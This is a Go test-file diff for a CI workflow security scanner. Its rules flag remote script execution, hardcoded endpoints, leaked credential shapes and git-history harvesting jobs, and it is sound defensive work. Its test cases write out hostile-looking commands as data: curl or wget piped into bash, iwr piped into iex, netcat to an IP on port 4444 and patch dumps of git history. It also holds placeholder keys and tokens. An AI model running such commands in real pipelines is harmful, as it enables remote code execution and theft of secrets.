@@ -414,6 +414,19 @@ func TestRulesRunThroughTheEngine(t *testing.T) {
 		{"ppe-008/dispatch-clean.yml", nil},
 		{"ppe-002/injected.yml", []string{Rule2ID, Rule2ID, Rule2ID, Rule2ID, Rule2ID, Rule2ID, Rule2ID}},
 		{"ppe-002/safe.yml", nil},
+		{"ppe-006/split_job.yml", nil},
+		{
+			"ppe-003/malicious.yml",
+			[]string{
+				Rule3ID, Rule3ID, Rule3ID,
+				Rule4ID, Rule4ID, Rule4ID, Rule4ID, Rule4ID, Rule4ID,
+				Rule5ID, Rule5ID, Rule5ID,
+			},
+		},
+		{
+			"ppe-006/correlated.yml",
+			[]string{Rule6ID, Rule6ID, Rule6ID},
+		},
 	}
 
 	for _, tt := range tests {
@@ -998,5 +1011,372 @@ func TestRunSiteLineAt(t *testing.T) {
 	unknown := runSite{script: "one\ntwo\n"}
 	if got := unknown.lineAt(4); got != 0 {
 		t.Errorf("lineAt with no runLine = %d, want 0", got)
+	}
+}
+
+// ---------------------------------------------------------------- rule 3
+
+func TestRule3FlagsRemoteScriptExec(t *testing.T) {
+	file, data := parseFixture(t, "ppe-003/malicious.yml")
+
+	got := Rule3(file)
+
+	assertFindings(t, got, []want{
+		{Rule3ID, findings.SeverityBlock, lineOf(t, data, "curl -sSL https://example.invalid/install.sh | bash")},
+		{Rule3ID, findings.SeverityBlock, lineOf(t, data, "wget -qO- https://example.invalid/setup.sh")},
+		{Rule3ID, findings.SeverityBlock, lineOf(t, data, "iwr https://example.invalid/p.ps1 -useb")},
+	})
+}
+
+// A shell line continuation splits the pipeline across lines. A matcher that
+// stops at a newline sees no pipe at all, which is how the wget and iwr shapes
+// were missed in the first run of this rule.
+func TestRule3CrossesLineContinuations(t *testing.T) {
+	tests := []struct {
+		name   string
+		script string
+		want   int
+	}{
+		{"single line", "curl -sSL https://host/x.sh | bash\n", 1},
+		{"continuation before the pipe", "wget -qO- https://host/x.sh \\\n  | sh\n", 1},
+		{"continuation before the downloader", "curl \\\n  -sSL https://host/x.sh | bash\n", 1},
+		{"sudo between pipe and shell", "curl https://host/x | sudo sh\n", 1},
+		{"bash, zsh, ksh", "curl https://host/x | zsh\n", 1},
+		{"powershell iex", "iwr https://host/x -useb | iex\n", 1},
+		{"piped into a checksum", "curl -sSL https://host/x.tar.gz | sha256sum -c -\n", 0},
+		{"piped into grep", "curl https://host/x | grep foo\n", 0},
+		{"no pipe at all", "curl -sSL https://host/x.sh -o /tmp/x\n", 0},
+		{"a shell in a path, not an interpreter", "echo /usr/local/bin/bash\n", 0},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			if got := len(remoteScriptMatches(tt.script)); got != tt.want {
+				t.Errorf("got %d matches, want %d for %q", got, tt.want, tt.script)
+			}
+		})
+	}
+}
+
+// The interpreter needs a word boundary after it, or every pipeline into
+// sha256sum is reported as remote code execution.
+func TestRule3InterpreterWordBoundary(t *testing.T) {
+	for _, script := range []string{
+		"curl https://host/x | sha256sum -c -\n",
+		"curl https://host/x | shasum\n",
+		"curl https://host/x | shopt -s nullglob\n",
+	} {
+		if got := len(remoteScriptMatches(script)); got != 0 {
+			t.Errorf("%q matched %d times, want 0: the interpreter needs a word boundary after it", script, got)
+		}
+	}
+}
+
+// ---------------------------------------------------------------- rule 4
+
+// A four part version and an IPv4 address are the same token shape. What
+// separates them is whether anything on the line is going to connect to it, so
+// this is the case that decides whether rule 4 blocks a Gradle build.
+func TestRule4RequiresNetworkContext(t *testing.T) {
+	tests := []struct {
+		script  string
+		wantIPs int
+		wantURL int
+		reason  string
+	}{
+		{"curl http://203.0.113.7/x -o /tmp/x\n", 1, 1, "a URL with an IP host is an endpoint"},
+		{"nc 203.0.113.7 4444 < /dev/null\n", 1, 0, "a network command with a bare IP"},
+		{"ssh user@10.0.0.5\n", 1, 0, "ssh with a bare IP"},
+		{"rsync -a file 10.0.0.5:/tmp/\n", 1, 0, "rsync with a bare IP"},
+		{"./gradlew build -Dversion=1.2.3.4\n", 0, 0, "a four part version is not an endpoint"},
+		{"echo \"building 1.2.3.4\"\n", 0, 0, "a version string in a message is not an endpoint"},
+		{"echo 10.0.0.1\n", 0, 0, "printing an address connects to nothing"},
+		{"wget http://internal.example.invalid/report\n", 0, 1, "a named host over http is the plaintext case"},
+		{"curl https://example.invalid/1.2.3.4/tool\n", 0, 0, "a version in an https path is neither"},
+		{"echo 999.999.999.999\n", 0, 0, "octets out of range are not an address"},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.reason, func(t *testing.T) {
+			got := literalEndpointMatches(tt.script)
+			var ips, urls int
+			for _, m := range got {
+				if m.kind == endpointIP {
+					ips++
+				} else {
+					urls++
+				}
+			}
+			if ips != tt.wantIPs || urls != tt.wantURL {
+				t.Errorf("got %d IPs and %d URLs, want %d and %d", ips, urls, tt.wantIPs, tt.wantURL)
+			}
+		})
+	}
+}
+
+// A URL whose host is a bare IP produces two findings at two tiers, and both
+// are wanted: they are different problems with different fixes.
+func TestRule4TiersForIPHostURL(t *testing.T) {
+	file, data := parseFixture(t, "ppe-003/malicious.yml")
+
+	var severities []findings.Severity
+	for _, f := range Rule4(file) {
+		severities = append(severities, f.Severity)
+	}
+
+	blocks, warns := 0, 0
+	for _, sev := range severities {
+		if sev == findings.SeverityBlock {
+			blocks++
+		}
+		if sev == findings.SeverityWarn {
+			warns++
+		}
+	}
+	if blocks != 3 {
+		t.Errorf("Block findings = %d, want 3 (two IP hosts plus one bare IP with netcat)", blocks)
+	}
+	if warns != 3 {
+		t.Errorf("Warn findings = %d, want 3 (one per http:// URL)", warns)
+	}
+	_ = data
+}
+
+// ---------------------------------------------------------------- rule 5
+
+func TestRule5FlagsCredentialPatterns(t *testing.T) {
+	file, data := parseFixture(t, "ppe-003/malicious.yml")
+
+	got := Rule5(file)
+
+	assertFindings(t, got, []want{
+		{Rule5ID, findings.SeverityBlock, lineOf(t, data, "export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE")},
+		{Rule5ID, findings.SeverityBlock, lineOf(t, data, "GH_TOKEN=ghp_EXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLE")},
+		{Rule5ID, findings.SeverityBlock, lineOf(t, data, "-----BEGIN OPENSSH PRIVATE KEY-----")},
+	})
+}
+
+// Each pattern has to match a real shaped value and not match the things that
+// merely look like its prefix.
+func TestCredentialPatternShapes(t *testing.T) {
+	tests := []struct {
+		pattern string
+		script  string
+		want    int
+		reason  string
+	}{
+		{"AKIAIOSFODNN7EXAMPLE", "export A=AKIAIOSFODNN7EXAMPLE\n", 1, "the AWS documentation example value"},
+		{"AKIA", "echo $AKIA_REGION\n", 0, "a variable named for a prefix is not a key"},
+		{"AKIA", "AKIASHORT\n", 0, "the body is required, not just the prefix"},
+		{"ghp_", "ghp_" + "a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8" + "\n", 1, "a 36 character body is a PAT"},
+		{"ghp_", "ghp_tooshort\n", 0, "too short to be a PAT"},
+		{"private key", "-----BEGIN RSA PRIVATE KEY-----\n", 1, "an RSA key block"},
+		{"private key", "-----BEGIN OPENSSH PRIVATE KEY-----\n", 1, "an OpenSSH key block"},
+		{"private key", "-----BEGIN CERTIFICATE-----\n", 0, "a certificate is not a private key"},
+		{"sk-", "sk-abcdefghijklmnopqrstuvwxyz123456\n", 1, "a long enough body"},
+		{"sk-", "echo sk-directory sk-prefix\n", 0, "hyphenated words are not keys"},
+		{"xoxb", "xoxb-1234567890-abcdefghij\n", 1, "a Slack bot token"},
+		{"xoxr", "xoxr-1234567890-abcdefghij\n", 1, "a Slack user token"},
+		{"xox", "xoxz-1234567890-abcdefghij\n", 0, "not a Slack token type"},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.reason, func(t *testing.T) {
+			if got := len(credentialMatches(tt.script)); got != tt.want {
+				t.Errorf("got %d matches, want %d for %q", got, tt.want, tt.script)
+			}
+		})
+	}
+}
+
+// ---------------------------------------------------------------- rule 6
+
+func TestRule6FlagsCorrelatedHarvest(t *testing.T) {
+	file, data := parseFixture(t, "ppe-006/correlated.yml")
+
+	got := Rule6(file)
+
+	assertFindings(t, got, []want{
+		{Rule6ID, findings.SeverityBlock, lineOf(t, data, "  harvest:")},
+		{Rule6ID, findings.SeverityBlock, lineOf(t, data, "  forensics:")},
+		{Rule6ID, findings.SeverityBlock, lineOf(t, data, "  blame:")},
+	})
+	for _, f := range got {
+		if f.Location.JobID == "" {
+			t.Error("a rule 6 finding does not name its job: the whole point is which job correlates")
+		}
+	}
+}
+
+// The correlation is per job. Two ordinary jobs in one workflow are not a
+// finding, and this is the case that decides whether rule 6 survives contact
+// with real repositories, since it blocks.
+func TestRule6NeedsBothSignalsInOneJob(t *testing.T) {
+	file, _ := parseFixture(t, "ppe-006/split_job.yml")
+
+	if got := Rule6(file); len(got) != 0 {
+		for _, f := range got {
+			t.Errorf("unexpected finding: %s on job %q, want none: the signals are in different jobs", f.RuleID, f.Location.JobID)
+		}
+	}
+}
+
+// git log on its own is a changelog job. Only the patch output dumps diffs, and
+// a diff is where a rotated secret still lives.
+func TestRule6HistoryNeedsAPatchFlag(t *testing.T) {
+	tests := []struct {
+		script string
+		want   bool
+		reason string
+	}{
+		{"git log -p -n 500 > /tmp/h.txt\n", true, "a patch dump reads every diff"},
+		{"git log --patch -1\n", true, "the long form of the same"},
+		{"git log -up -1\n", true, "a grouped short flag containing p"},
+		{"git rev-list --all\n", true, "walks every commit"},
+		{"git show HEAD~5 --stat\n", true, "prints a commit"},
+		{"git log --pretty=format:\"%s\" v1.0.0..HEAD\n", false, "one line per commit is a changelog"},
+		{"git log --oneline -n 10\n", false, "subjects only is not a diff"},
+		{"echo /usr/bin/gitlog\n", false, "a path, not a command"},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.reason, func(t *testing.T) {
+			if got := readsHistory(tt.script); got != tt.want {
+				t.Errorf("readsHistory(%q) = %v, want %v", tt.script, got, tt.want)
+			}
+		})
+	}
+}
+
+// fetch-depth is compared as text, because parse does not type convert, so the
+// quoted "0" is the same signal as the bare 0.
+func TestRule6FetchDepthIsComparedAsText(t *testing.T) {
+	tests := []struct {
+		name        string
+		depth       string
+		history     string
+		wantFinding bool
+	}{
+		{"depth 0 and a patch dump", "0", "git log -p", true},
+		{"quoted depth 0 and a patch dump", `"0"`, "git log -p", true},
+		{"depth 1 and a patch dump", "1", "git log -p", false},
+		{"depth 0 and a changelog", "0", "git log --oneline", false},
+		{"depth 0 and no history", "0", "npm ci", false},
+		{"no depth and a patch dump", "", "git log -p", false},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			// The with: block is only written when there is a depth, because a
+			// with: key with nothing under it is a parse error.
+			with := ""
+			if tt.depth != "" {
+				with = "        with:\n          fetch-depth: " + tt.depth + "\n"
+			}
+			src := "jobs:\n  harvest:\n    runs-on: ubuntu-latest\n    steps:\n" +
+				"      - uses: actions/checkout@0123456789abcdef0123456789abcdef01234567\n" +
+				with +
+				"      - run: " + tt.history + "\n"
+			file, err := parse.Parse([]byte(src))
+			if err != nil {
+				t.Fatalf("Parse: %v", err)
+			}
+			if got := len(Rule6(file)) > 0; got != tt.wantFinding {
+				t.Errorf("fired = %v, want %v", got, tt.wantFinding)
+			}
+		})
+	}
+}
+
+// All four of these block. They are the rules that fire on attacker-controlled
+// content, which is the only thing allowed to fail a merge.
+func TestRules3To6Block(t *testing.T) {
+	malicious, _ := parseFixture(t, "ppe-003/malicious.yml")
+	for name, got := range map[string]findings.Findings{
+		"rule 3": Rule3(malicious),
+		"rule 4": Rule4(malicious),
+		"rule 5": Rule5(malicious),
+	} {
+		if len(got) == 0 {
+			t.Errorf("%s produced no findings on the malicious fixture", name)
+			continue
+		}
+		if !got.HasBlock() {
+			t.Errorf("%s does not block: rules 3 to 6 are the blocking set", name)
+		}
+	}
+
+	correlated, _ := parseFixture(t, "ppe-006/correlated.yml")
+	if !Rule6(correlated).HasBlock() {
+		t.Error("rule 6 does not block")
+	}
+}
+
+// A URL with credentials in it, http://user:pass@10.0.0.1/x. The host is still
+// the bare IP, so the network context is present, and the credentials before it
+// must not make the host check think there is a path in the way.
+func TestInsideURLHostWithCredentials(t *testing.T) {
+	line := "curl http://user:pass@10.0.0.1/x"
+	if !insideURLHost(line, strings.Index(line, "10.0.0.1")) {
+		t.Error("a URL with credentials should still report its IP host as a host")
+	}
+
+	// And the path check must still exclude a version in the path of the same
+	// URL shape.
+	pathLine := "curl http://user:pass@host.example/1.2.3.4/x"
+	if !insideURLPath(pathLine, strings.Index(pathLine, "1.2.3.4")) {
+		t.Error("a version in the path of a URL with credentials should be excluded")
+	}
+}
+
+// Several credential patterns in one script, each reported once and in script
+// order, so a script with two of them does not report the second one first.
+func TestCredentialMatchesAreInScriptOrder(t *testing.T) {
+	script := "first AKIAIOSFODNN7EXAMPLE\nthen xoxb-1234567890-abcdefghij\nlast sk-abcdefghijklmnopqrstuvwxyz\n"
+	got := credentialMatches(script)
+
+	if len(got) != 3 {
+		t.Fatalf("got %d matches, want 3", len(got))
+	}
+	for i := 1; i < len(got); i++ {
+		if got[i].offset <= got[i-1].offset {
+			t.Errorf("match %d at offset %d is not after match %d at offset %d",
+				i, got[i].offset, i-1, got[i-1].offset)
+		}
+	}
+	if got[0].patternName != "AWS access key id" {
+		t.Errorf("first match pattern = %q, want AWS access key id", got[0].patternName)
+	}
+}
+
+// Endpoints are reported in script order too, so a line with both an IP and a
+// URL comes out the way it is written rather than all IPs then all URLs.
+func TestEndpointMatchesAreInScriptOrder(t *testing.T) {
+	script := "nc 10.0.0.1 4444\nwget http://host.example/x\ncurl 10.0.0.2:80/y\n"
+	got := literalEndpointMatches(script)
+
+	if len(got) != 3 {
+		t.Fatalf("got %d matches, want 3", len(got))
+	}
+	for i := 1; i < len(got); i++ {
+		if got[i].offset <= got[i-1].offset {
+			t.Errorf("match %d at offset %d is not after match %d at offset %d",
+				i, got[i].offset, i-1, got[i-1].offset)
+		}
+	}
+}
+
+// A script with no trailing newline still has its lines counted, so an offset
+// at the very end maps to a real line rather than past the end of the file.
+func TestScriptLinesWithoutTrailingNewline(t *testing.T) {
+	lines := scriptLines("one\ntwo")
+	if len(lines) != 2 {
+		t.Fatalf("got %d lines, want 2", len(lines))
+	}
+	if lines[1].text != "two" {
+		t.Errorf("second line = %q, want two", lines[1].text)
+	}
+	if lines[1].offset != 4 {
+		t.Errorf("second line offset = %d, want 4", lines[1].offset)
 	}
 }
